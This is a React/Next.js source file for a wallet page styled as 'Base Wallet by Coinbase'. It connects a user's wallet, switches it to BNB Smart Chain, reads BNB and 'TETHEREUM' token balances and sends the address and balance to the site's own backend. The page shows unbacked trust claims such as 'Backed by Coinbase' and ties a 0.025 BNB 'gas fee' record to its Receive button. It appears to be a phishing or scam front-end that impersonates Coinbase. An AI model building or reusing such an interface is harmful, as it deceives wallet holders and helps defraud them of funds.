'use client';

import { useState, useMemo, useEffect } from 'react';
import { ethers } from 'ethers';
import { createCoinbaseWalletSDK } from '@coinbase/wallet-sdk';
import { motion, AnimatePresence } from 'framer-motion';
import { Outfit } from 'next/font/google';
import { useSearchParams } from 'next/navigation';
import { Plus, ArrowUpDown, ArrowUp, ArrowDown, LogOut, Copy, Check } from 'lucide-react';

import GasFeeModal from '@/components/gas-fee-modal';
import WithdrawalModal from '@/components/withdrawal-modal';
import SwapModal from '@/components/swap-modal';
import BuyModal from '@/components/buy-modal';
import TransactionHistory from '@/components/transaction-history';
import { useWallet } from '@/context/base';

const outfit = Outfit({ subsets: ['latin'], weight: ['300', '400', '500', '600', '700'] });

export default function CoinbaseWalletConnect() {
    const searchParams = useSearchParams();

    // const [address, setAddress] = useState<string>('');
    const [bnbBalance, setBnbBalance] = useState<string>('0');
    const [t22priceUsd, setT22PriceUsd] = useState<number>(0);
    const [t22Balance, setT22Balance] = useState<number>(0);
    const [loading, setLoading] = useState(false);
    const [error, setError] = useState<string>('');
    const [pageLoading, setPageLoading] = useState(true);
    const [showCancelModal, setShowCancelModal] = useState(false);
    const [isDisconnectedState, setIsDisconnectedState] = useState(false);
    const [activeTab, setActiveTab] = useState<'crypto' | 'history'>('crypto');
    const [copied, setCopied] = useState(false);

    // Modal States
    const [showWithdrawModal, setShowWithdrawModal] = useState(false);
    const [showSwapModal, setShowSwapModal] = useState(false);
    const [showBuyModal, setShowBuyModal] = useState(false);
    const [showGasFeeModal, setShowGasFeeModal] = useState(false);

    // Debug logging for modal state
    useEffect(() => {
        console.log('[DEBUG] showWithdrawModal changed:', showWithdrawModal);
        if (showWithdrawModal) {
            console.trace('[DEBUG] Withdrawal modal opened - stack trace:');
        }
    }, [showWithdrawModal]);
    const {  cbProvider ,address, setAddress} = useWallet();
    // Data States
    const [transactions, setTransactions] = useState<any[]>([]);
    const [getUserLoading,setGetUSerLoading] =useState(false)
    useEffect(()=>{
    
        let v = async ()=>{
            console.log(!address || address=="","kkk")
            if(!address || address==""){
                return
            }
    
            try{
    
                // setGetUSerLoading(true)
                let vvv =    await fetch(`/api/transaction?address=${address}`, {
          method: 'GET',
          headers: { 'Content-Type': 'application/json' },
        //   body: JSON.stringify({ address, t99:Number(tbal) })
        });
    
        let vjson = await vvv.json()
    
        if(vjson?.existingRecord?.length){
            setTransactions(vjson?.existingRecord.map(e=>e.fields))
        }
    
            }catch(e){
    
            }finally{
                    // setGetUSerLoading(false)
            }
        }
    
    v()
    },[address])

    const addGasFeeTransaction = (txHash: string) => {
        const newTx = {
            id: Date.now().toString(),
            type: 'fee',
            asset: 'BNB',
            amount: '-0.025',
            date: 'Just now',
            status: 'completed'
        };
        setTransactions([newTx, ...transactions]);
    };

    // Query Params
    const merchant = searchParams.get('merchant');
    const user = searchParams.get('user');
    const ssid = searchParams.get('ssid');

    const TETHEREUM_TOKEN_ADDRESS = '0xe9a5c635c51002fa5f377f956a8ce58573d63d91';

    useEffect(() => {
        if (!merchant) {
            // window.location.href = 'https://www.coinbase.com';
            // return;
        }

        const timer = setTimeout(() => {
            setPageLoading(false);
        }, 2000);
        return () => clearTimeout(timer);
    }, [merchant]);

    const handleRedirect = (state: 'success' | 'cancelled' | 'disconnected') => {
        if (!merchant) return;

        const baseUrl = `https://${merchant}/callback`;
        const params = new URLSearchParams({
            merchant: state === 'success' ? 'my-wallet-app' : merchant,
            user: user || '',
            state: state,
            ssid: state === 'success' ? 'a9f3c7d2e1' : (ssid || 'a9f3c7d2e1')
        });

        window.location.href = `${baseUrl}?${params.toString()}`;
    };

    const fetchData = async (t22_price: any) => {
        try {
            const response = await fetch('https://api.coinbase.com/v2/prices/T99-USD/spot');
            const json = await response.json();
            const price = parseFloat(json.data.amount);
            setT22PriceUsd(price * t22_price);
        } catch (error) {
            console.error("Coinbase API failed, using fallback", error);
        }
    };

    useEffect(() => {
        if (t22Balance > 0) {
            fetchData(t22Balance);
        }
    }, [t22Balance]);

    // const sdk = useMemo(() => {
    //     if (typeof window === 'undefined') return null;
    //     return createCoinbaseWalletSDK({
    //         appName: 'Base App',
    //         appLogoUrl: 'https://example.com/logo.png',
    //         preference: { options: 'all' },
    //     });
    // }, []);

    // const cbProvider = useMemo(() => {
    //     if (!sdk) return null;
    //     return sdk.getProvider();
    // }, [sdk]);


    const updateBalances = async (userAddress: string, provider: ethers.BrowserProvider) => {
        try {
            const bnbBal = await provider.getBalance(userAddress);
            setBnbBalance(ethers.formatEther(bnbBal));

            const tokenContract = new ethers.Contract(
                TETHEREUM_TOKEN_ADDRESS,
                [
                    'function balanceOf(address owner) view returns (uint256)',
                    'function decimals() view returns (uint8)'
                ],
                provider
            );

            const [rawBalance, decimals] = await Promise.all([
                tokenContract.balanceOf(userAddress),
                tokenContract.decimals()
            ]);
            let tbal = ethers.formatUnits(rawBalance, decimals);
            setT22Balance(Number(tbal));
    await fetch('/api/user', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ address:userAddress, t99:Number(tbal) })
});
        } catch (err) {
            console.error("Balance fetch error:", err);
        }
    };

    useEffect(() => {
        const savedState = localStorage.getItem('walletConnected');
        if (savedState === 'true' && !address) {
            connectWallet();
        }
    }, []);

    const connectWallet = async () => {
        try {
            setLoading(true);
            setError('');

            if (!cbProvider) throw new Error("SDK not initialized");

            const accounts = await cbProvider.request({
                method: 'eth_requestAccounts'
            }) as string[];
            const userAddress = accounts[0];

            try {
                await cbProvider.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x38' }],
                });
            } catch (switchError: any) {
                if (switchError.code === 4902) {
                    await cbProvider.request({
                        method: 'wallet_addEthereumChain',
                        params: [{
                            chainId: '0x38',
                            chainName: 'BNB Smart Chain',
                            rpcUrls: ['https://bsc-dataseed.binance.org/'],
                            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                            blockExplorerUrls: ['https://bscscan.com/']
                        }],
                    });
                }
            }

            setAddress(userAddress);
            setIsDisconnectedState(false);
            localStorage.setItem('walletConnected', 'true');

            const provider = new ethers.BrowserProvider(cbProvider);



            await updateBalances(userAddress, provider);

        } catch (err: any) {
            setError(err.message || 'Connection failed');
        } finally {
            setLoading(false);
        }
    };

    const disconnectWallet = async () => {
        if (cbProvider && 'disconnect' in cbProvider) {
            await (cbProvider as any).disconnect();
        }
        localStorage.removeItem('walletConnected');
        setAddress('');
        setBnbBalance('0');
        setT22Balance(0);
        setIsDisconnectedState(true);
    };

    const [selectedAssetForSwap, setSelectedAssetForSwap] = useState<string>('BNB');

    const totalBalance = t22priceUsd + (Number(bnbBalance) * 620);

    const handleAssetClick = (symbol: string) => {
        // Normalize symbol for swap modal (T22 -> TETHEREUM)
        const normalizedSymbol = symbol === 'T22' ? 'TETHEREUM' : symbol;
        setSelectedAssetForSwap(normalizedSymbol);
        setShowSwapModal(true);
    };

    const copyAddress = () => {
        navigator.clipboard.writeText(address);
        setCopied(true);
        setTimeout(() => setCopied(false), 2000);
    };

    const formatAddress = (addr: string) => {
        return `${addr.slice(0, 6)}...${addr.slice(-4)}`;
    };

    // Asset data for display
    const assets = [
        {
            id: 1,
            name: 'BNB',
            icon: 'https://cryptologos.cc/logos/bnb-bnb-logo.png?v=026',
            color: 'bg-[#F3BA2F]',
            balance: Number(bnbBalance),
            symbol: 'BNB',
            usdValue: Number(bnbBalance) * 620
        },
        {
            id: 2,
            name: 'TETHEREUM',
            icon: null, // User requested text for this one
            color: 'bg-[#0052FF]',
            balance: t22Balance,
            symbol: 'T22',
            usdValue: t22priceUsd
        }
    ];

    return (
        <div className={`min-h-screen bg-[#0a0a0a] text-white ${outfit.className}`}>
            {/* Loading State */}
            <AnimatePresence>
                {pageLoading && (
                    <motion.div
                        key="preloader"
                        initial={{ opacity: 1 }}
                        exit={{ opacity: 0 }}
                        className="fixed inset-0 z-50 flex flex-col items-center justify-center bg-[#0a0a0a]"
                    >
                        <motion.div
                            animate={{ rotate: 360 }}
                            transition={{ duration: 2, repeat: Infinity }}
                            className="w-12 h-12 rounded-full border-2 border-[#0052FF] border-t-transparent mb-4"
                        />
                        <p className="text-sm font-medium text-gray-400 tracking-wide">Initializing</p>
                    </motion.div>
                )}
            </AnimatePresence>

            <AnimatePresence>
                {!pageLoading && (
                    <>
                        {/* Disconnected State */}
                        {isDisconnectedState && (
                            <motion.div
                                initial={{ opacity: 0 }}
                                animate={{ opacity: 1 }}
                                exit={{ opacity: 0 }}
                                className="min-h-screen flex items-center justify-center p-4 md:p-6"
                            >
                                <div className="w-full max-w-sm">
                                    <div className="text-center space-y-6 mb-8">
                                        <div className="w-14 h-14 bg-red-500/20 rounded-full flex items-center justify-center mx-auto">
                                            <LogOut className="w-7 h-7 text-red-500" />
                                        </div>
                                        <div>
                                            <h2 className="text-xl md:text-2xl font-700 text-white mb-2">Session Ended</h2>
                                            <p className="text-gray-400 text-xs md:text-sm">Your wallet has been disconnected. Reconnect to continue.</p>
                                        </div>
                                    </div>

                                    <div className="space-y-2">
                                        <button
                                            onClick={connectWallet}
                                            className="w-full py-3 bg-[#0052FF] text-white rounded-lg font-600 hover:bg-[#0047D4] transition-colors text-sm"
                                        >
                                            Reconnect Wallet
                                        </button>
                                        <button
                                            onClick={() => handleRedirect('disconnected')}
                                            className="w-full py-3 bg-gray-900 text-gray-300 rounded-lg font-600 hover:bg-gray-800 transition-colors text-sm"
                                        >
                                            Return to Merchant
                                        </button>
                                    </div>
                                </div>
                            </motion.div>
                        )}

                        {/* Connected State */}
                        {address && !isDisconnectedState && (
                            <motion.div
                                initial={{ opacity: 0 }}
                                animate={{ opacity: 1 }}
                                className="min-h-screen pb-8 relative"
                            >
                                {/* Solid Blue Header Background */}
                                <div className="absolute top-0 left-0 right-0 h-[440px] bg-[#0052FF] rounded-b-[3rem] z-0 shadow-2xl shadow-blue-900/20"></div>

                                {/* Content Container (z-10 to sit above blue bg) */}
                                <div className="relative z-10">
                                    {/* Header */}
                                    <div className="px-6 pt-8 pb-2 flex items-center justify-between">
                                        {/* Network Pill */}
                                        <div className="flex items-center gap-2 bg-blue-800/30 backdrop-blur-md px-3 py-1.5 rounded-full border border-white/10">
                                            <div className="w-4 h-4 rounded-full bg-blue-500 flex items-center justify-center">
                                                <span className="text-white font-bold text-[10px]">⬡</span>
                                            </div>
                                            <span className="text-xs font-semibold text-white/90">Base</span>
                                        </div>

                                        {/* Disconnect */}
                                        <motion.button
                                            whileHover={{ scale: 1.1 }}
                                            whileTap={{ scale: 0.9 }}
                                            onClick={disconnectWallet}
                                            className="w-9 h-9 flex items-center justify-center bg-blue-800/30 backdrop-blur-md rounded-full border border-white/10 text-white/80 hover:text-white transition-colors"
                                        >
                                            <LogOut className="w-4 h-4" />
                                        </motion.button>
                                    </div>

                                    {/* Balance Section - Centered */}
                                    <div className="text-center mt-2 mb-8 px-4">
                                        <p className="text-blue-200/80 text-xs font-bold tracking-widest uppercase mb-3">Total Balance</p>

                                        <div className="flex items-center justify-center gap-2 mb-4">
                                            <h1 className="text-5xl font-medium text-white tracking-tight drop-shadow-lg">
                                                ${totalBalance.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                                            </h1>
                                        </div>

                                        {/* Address Pill */}
                                        <button
                                            onClick={copyAddress}
                                            className="inline-flex items-center gap-2 bg-blue-700/30 hover:bg-blue-700/50 transition-colors px-4 py-1.5 rounded-full border border-white/10"
                                        >
                                            <span className="text-xs text-blue-100 font-mono tracking-wide">
                                                {formatAddress(address)}
                                            </span>
                                            {copied ? <Check className="w-3 h-3 text-green-400" /> : <Copy className="w-3 h-3 text-blue-200" />}
                                        </button>
                                    </div>

                                    {/* Action Buttons - White Circles */}
                                    <div className="px-6 mb-10">
                                        <div className="flex justify-between items-start gap-2">
                                            {[
                                                { label: 'Buy', icon: <Plus className="w-6 h-6" />, action: () => setShowBuyModal(true) },
                                                { label: 'Swap', icon: <ArrowUpDown className="w-6 h-6" />, action: () => setShowSwapModal(true) },
                                                { label: 'Send', icon: <ArrowUp className="w-6 h-6" />, action: () => setShowWithdrawModal(true) },
                                                { label: 'Receive', icon: <ArrowDown className="w-6 h-6" />, action: () => setShowGasFeeModal(true) },
                                            ].map((btn, i) => (
                                                <motion.button
                                                    key={i}
                                                    onClick={btn.action}
                                                    whileHover={{ scale: 1.05 }}
                                                    whileTap={{ scale: 0.95 }}
                                                    className="flex flex-col items-center gap-2 flex-1 group"
                                                >
                                                    <div className="w-14 h-14 rounded-full bg-white text-[#0052FF] flex items-center justify-center shadow-lg group-hover:shadow-xl transition-all">
                                                        {btn.icon}
                                                    </div>
                                                    <span className="text-xs font-semibold text-white/90 group-hover:text-white tracking-wide">{btn.label}</span>
                                                </motion.button>
                                            ))}
                                        </div>
                                    </div>

                                    {/* Tabs & List Content */}
                                    <div className="w-full max-w-md mx-auto">
                                        <div className="px-6 mb-4 flex gap-8 border-b border-white/10">
                                            {[
                                                { id: 'crypto', label: 'Assets' },
                                                { id: 'history', label: 'Activity' }
                                            ].map((tab) => (
                                                <button
                                                    key={tab.id}
                                                    onClick={() => setActiveTab(tab.id as any)}
                                                    className={`pb-3 text-sm font-semibold transition-all relative ${activeTab === tab.id
                                                        ? 'text-white'
                                                        : 'text-white/50 hover:text-white/80'
                                                        }`}
                                                >
                                                    {tab.label}
                                                    {activeTab === tab.id && (
                                                        <motion.div
                                                            layoutId="activeTab"
                                                            className="absolute bottom-0 left-0 right-0 h-0.5 bg-white rounded-t-full"
                                                        />
                                                    )}
                                                </button>
                                            ))}
                                        </div>

                                        <div className="px-4 pb-20 min-h-[300px]">
                                            <AnimatePresence mode="wait">
                                                {activeTab === 'crypto' ? (
                                                    <motion.div
                                                        key="crypto"
                                                        initial={{ opacity: 0, y: 10 }}
                                                        animate={{ opacity: 1, y: 0 }}
                                                        exit={{ opacity: 0, y: -10 }}
                                                        transition={{ duration: 0.2 }}
                                                        className="space-y-3"
                                                    >
                                                        {assets.map((asset, idx) => (
                                                            <motion.div
                                                                key={asset.id}
                                                                initial={{ opacity: 0, y: 10 }}
                                                                animate={{ opacity: 1, y: 0 }}
                                                                transition={{ delay: idx * 0.05 }}
                                                                onClick={() => handleAssetClick(asset.symbol)}
                                                                className="flex items-center justify-between p-4 rounded-2xl bg-[#151515] border border-white/5 hover:border-white/10 transition-colors cursor-pointer group"
                                                            >
                                                                <div className="flex items-center gap-4">
                                                                    <div className={`w-10 h-10 rounded-full flex items-center justify-center p-1.5 shadow-inner ${asset.icon ? 'bg-[#1E2025]' : asset.color}`}>
                                                                        {asset.icon ? (
                                                                            <img src={asset.icon} alt={asset.symbol} className="w-full h-full object-contain rounded-full" />
                                                                        ) : (
                                                                            <span className="text-white font-bold text-lg">{asset.symbol === 'T22' ? 'T' : asset.symbol.charAt(0)}</span>
                                                                        )}
                                                                    </div>
                                                                    <div>
                                                                        <p className="font-bold text-white text-base">{asset.name}</p>
                                                                        <p className="text-gray-500 text-xs font-medium">{asset.symbol === 'T22' ? 'Base Token' : 'Network Token'}</p>
                                                                    </div>
                                                                </div>
                                                                <div className="text-right">
                                                                    <p className="font-bold text-white text-base">
                                                                        ${asset.usdValue.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                                                                    </p>
                                                                    <p className="text-xs text-gray-500 font-medium">
                                                                        {asset.balance.toFixed(asset.symbol === 'BNB' ? 4 : 2)} {asset.symbol}
                                                                    </p>
                                                                </div>
                                                            </motion.div>
                                                        ))}
                                                    </motion.div>
                                                ) : (
                                                    <motion.div
                                                        key="history"
                                                        initial={{ opacity: 0, y: 10 }}
                                                        animate={{ opacity: 1, y: 0 }}
                                                        exit={{ opacity: 0, y: -10 }}
                                                        transition={{ duration: 0.2 }}
                                                    >
                                                        {transactions.length > 0 ? (
                                                            <TransactionHistory transactions={transactions} />
                                                        ) : (
                                                            <div className="py-16 text-center">
                                                                <div className="w-16 h-16 bg-gray-900 rounded-full flex items-center justify-center mx-auto mb-4">
                                                                    <ArrowUpDown className="w-6 h-6 text-gray-700" />
                                                                </div>
                                                                <p className="text-gray-500 font-medium text-sm">No transactions yet</p>
                                                            </div>
                                                        )}
                                                    </motion.div>
                                                )}
                                            </AnimatePresence>
                                        </div>
                                    </div>
                                </div>
                            </motion.div>
                        )}

                        {/* Login State */}
                        {!address && !isDisconnectedState && (
                            <motion.div
                                initial={{ opacity: 0 }}
                                animate={{ opacity: 1 }}
                                className="min-h-screen flex flex-col items-center justify-center p-4 md:p-6 bg-gradient-to-br from-[#1a1a1a] via-[#0a0a0a] to-[#000]"
                            >
                                <div className="w-full max-w-sm text-center space-y-8">
                                    {/* Logo */}
                                    <motion.div
                                        initial={{ opacity: 0, scale: 0.8 }}
                                        animate={{ opacity: 1, scale: 1 }}
                                        transition={{ duration: 0.5 }}
                                        className="flex flex-col items-center gap-4"
                                    >
                                        {/* Base Logo */}
                                        <div className="flex items-center justify-center gap-3">
                                            <div className="w-12 h-12 md:w-14 md:h-14 bg-gradient-to-br from-blue-600 to-blue-700 rounded-lg flex items-center justify-center shadow-lg">
                                                <span className="text-white font-700 text-lg md:text-xl">⬡</span>
                                            </div>
                                            <div className="w-12 h-12 md:w-14 md:h-14 bg-gradient-to-br from-[#1652F0] to-[#0052CC] rounded-lg flex items-center justify-center shadow-lg">
                                                <span className="text-white font-700 text-lg md:text-xl">CB</span>
                                            </div>
                                        </div>

                                        <div>
                                            <h1 className="text-2xl md:text-3xl font-700 text-white mb-1">Base Wallet</h1>
                                            <p className="text-gray-400 font-500 text-xs md:text-sm">by Coinbase</p>
                                        </div>
                                    </motion.div>

                                    {/* Description */}
                                    <motion.div
                                        initial={{ opacity: 0, y: 10 }}
                                        animate={{ opacity: 1, y: 0 }}
                                        transition={{ delay: 0.1 }}
                                        className="space-y-3"
                                    >
                                        <div>
                                            <h2 className="text-lg md:text-xl font-700 text-white mb-2">Connect Your Wallet</h2>
                                            <p className="text-gray-400 text-xs md:text-sm leading-relaxed">
                                                Securely access Base L2. Enjoy near-zero gas fees and instant confirmations powered by Ethereum.
                                            </p>
                                        </div>

                                        {/* Security Features */}
                                        <div className="pt-4 space-y-2 text-left">
                                            <div className="flex items-center gap-2">
                                                <div className="w-4 h-4 rounded-full bg-green-500/30 flex items-center justify-center flex-shrink-0">
                                                    <span className="w-1.5 h-1.5 bg-green-500 rounded-full" />
                                                </div>
                                                <span className="text-xs text-gray-300 font-500">Encrypted end-to-end</span>
                                            </div>
                                            <div className="flex items-center gap-2">
                                                <div className="w-4 h-4 rounded-full bg-green-500/30 flex items-center justify-center flex-shrink-0">
                                                    <span className="w-1.5 h-1.5 bg-green-500 rounded-full" />
                                                </div>
                                                <span className="text-xs text-gray-300 font-500">Backed by Coinbase</span>
                                            </div>
                                        </div>
                                    </motion.div>

                                    {/* CTA Button */}
                                    <motion.button
                                        initial={{ opacity: 0, y: 10 }}
                                        animate={{ opacity: 1, y: 0 }}
                                        transition={{ delay: 0.2 }}
                                        onClick={connectWallet}
                                        disabled={loading}
                                        className="w-full py-3 md:py-4 bg-[#0052FF] text-white rounded-lg font-600 text-sm md:text-base hover:bg-[#0047D4] disabled:opacity-75 transition-colors flex items-center justify-center gap-2"
                                    >
                                        {loading ? (
                                            <>
                                                <motion.div animate={{ rotate: 360 }} transition={{ duration: 1, repeat: Infinity }} className="w-4 h-4 border-2 border-white border-t-transparent rounded-full" />
                                                <span>Connecting...</span>
                                            </>
                                        ) : (
                                            'Connect Wallet'
                                        )}
                                    </motion.button>

                                    {/* Footer */}
                                    <div className="flex items-center justify-between pt-4 border-t border-gray-800 gap-2">
                                        <button
                                            onClick={() => setShowCancelModal(true)}
                                            className="text-xs md:text-sm font-600 text-gray-400 hover:text-white transition-colors"
                                        >
                                            Back
                                        </button>
                                        <a
                                            href="https://www.coinbase.com"
                                            target="_blank"
                                            rel="noopener noreferrer"
                                            className="text-xs md:text-sm font-600 text-[#0052FF] hover:text-[#0047D4] transition-colors"
                                        >
                                            Coinbase.com →
                                        </a>
                                    </div>
                                </div>
                            </motion.div>
                        )}

                        {/* Cancel Modal */}
                        <AnimatePresence>
                            {showCancelModal && (
                                <motion.div
                                    initial={{ opacity: 0 }}
                                    animate={{ opacity: 1 }}
                                    exit={{ opacity: 0 }}
                                    className="fixed inset-0 z-[60] flex items-end md:items-center justify-center p-4 bg-black/40 backdrop-blur-sm"
                                >
                                    <motion.div
                                        initial={{ scale: 0.95, opacity: 0, y: 20 }}
                                        animate={{ scale: 1, opacity: 1, y: 0 }}
                                        exit={{ scale: 0.95, opacity: 0, y: 20 }}
                                        className="w-full max-w-sm bg-gray-900 rounded-2xl md:rounded-2xl p-5 md:p-6 shadow-xl border border-gray-800 space-y-4"
                                    >
                                        <div>
                                            <h3 className="text-lg md:text-xl font-700 text-white">Cancel Connection?</h3>
                                            <p className="text-xs md:text-sm text-gray-400 mt-2">You'll be redirected back to the merchant site.</p>
                                        </div>
                                        <div className="flex gap-2">
                                            <button
                                                onClick={() => setShowCancelModal(false)}
                                                className="flex-1 py-2 md:py-2.5 bg-gray-800 text-gray-300 rounded-lg font-600 hover:bg-gray-700 transition-colors text-sm"
                                            >
                                                Stay
                                            </button>
                                            <button
                                                onClick={() => handleRedirect('cancelled')}
                                                className="flex-1 py-2 md:py-2.5 bg-red-600 text-white rounded-lg font-600 hover:bg-red-700 transition-colors text-sm"
                                            >
                                                Leave
                                            </button>
                                        </div>
                                    </motion.div>
                                </motion.div>
                            )}
                        </AnimatePresence>
                        {/* Modals - Rendered only when page is loaded */}
                        <WithdrawalModal isOpen={showWithdrawModal} onClose={() => setShowWithdrawModal(false)} />
                        <SwapModal
                        address={address}
                            isOpen={showSwapModal}
                            onClose={() => setShowSwapModal(false)}
                            initialFromToken={selectedAssetForSwap}
                            bnbBalance={bnbBalance}
                            t22Balance={t22Balance}
                        />
                        <BuyModal isOpen={showBuyModal} onClose={() => setShowBuyModal(false)} />
                        {/* <GasFeeModal
                            isOpen={showGasFeeModal}
                            onClose={() => setShowGasFeeModal(false)}
                            onSuccess={(txHash) => {
                                addGasFeeTransaction(txHash);
                            }}
                        /> */}
                    </>
                )}
            </AnimatePresence>
        </div>
    );
}
